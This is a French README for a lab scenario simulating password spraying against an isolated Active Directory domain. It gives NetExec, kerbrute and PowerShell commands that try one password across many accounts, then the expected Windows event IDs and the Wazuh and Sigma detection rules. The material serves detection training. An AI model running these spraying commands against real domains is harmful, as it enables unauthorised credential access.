# Scénario 02 — Password spraying Active Directory

| | |
|---|---|
| **Technique MITRE** | [T1110.003 — Brute Force: Password Spraying](https://attack.mitre.org/techniques/T1110/003/) |
| **Tactique** | TA0006 Credential Access |
| **Cible** | DC01 (`10.20.0.10`), domaine `lab.local` |
| **Lancé depuis** | ATTACK01 (`nxc`/`kerbrute`) — ou WS01 (PowerShell) en profil léger |
| **Réf. Atomic Red Team** | T1110.003 |

## Principe

Le spraying teste **un seul** mot de passe courant sur **beaucoup** de comptes, pour
**rester sous le seuil de verrouillage** (contrairement au brute force). Ici, le mot de
passe `Printemps2026!` est pulvérisé sur les comptes de `users.txt`.

## Exécuter

```bash
./attack.sh            # simulation
./attack.sh --execute  # pulvérisation contre DC01 (labo isolé)
```

Commande sous-jacente (NetExec / CrackMapExec) :

```bash
nxc smb 10.20.0.10 -u users.txt -p 'Printemps2026!' -d lab.local --continue-on-success
```

Alternative Kerberos :

```bash
kerbrute passwordspray -d lab.local --dc 10.20.0.10 users.txt 'Printemps2026!'
```

### Profil léger — depuis WS01 (PowerShell natif, sans outil tiers)

```powershell
# À lancer sur WS01. Teste un mot de passe sur plusieurs comptes du domaine.
$pw = 'Printemps2026!'
'jdupont','amartin','pbernard','svc_backup','svc_sql' | ForEach-Object {
    $u = "lab\$_"
    # Une tentative par compte => EventID 4625 côté DC01 en cas d'échec.
    (New-Object DirectoryServices.DirectoryEntry("LDAP://10.20.0.10", $u, $pw)).Name 2>$null
}
```

## Journaux attendus — DC01 (journal Security)

| Event ID | Signification | Champ clé |
|----------|---------------|-----------|
| **4625** | Échec d'ouverture de session | `TargetUserName`, `IpAddress`, `SubStatus 0xC000006A` (mauvais mot de passe) |
| **4768** | Demande de TGT Kerberos | — |
| **4771** | Échec de pré-authentification Kerberos | `TargetUserName`, code `0x18` |
| **4740** | Verrouillage de compte (si seuil atteint) | `TargetUserName` |

Signature du spraying : **plusieurs `TargetUserName` différents, même `IpAddress`,
fenêtre courte**. Voir [`expected-logs.md`](expected-logs.md).

## Détection

- **Wazuh** — [`detection/wazuh/local_rules.xml`](../../detection/wazuh/local_rules.xml)
  - `100200` (4625) → `100201` : **≥ 5 comptes différents / même IP / 120 s**
  - `100202` (4771) → `100203` : variante Kerberos
- **Sigma** — [`detection/sigma/ad_password_spraying.yml`](../../detection/sigma/ad_password_spraying.yml)
  (corrélation `value_count` ≥ 5 `TargetUserName` distincts par `IpAddress`).

## Réponse à incident

Rapport : [`docs/incident-response/IR-002-password-spraying.md`](../../docs/incident-response/IR-002-password-spraying.md).
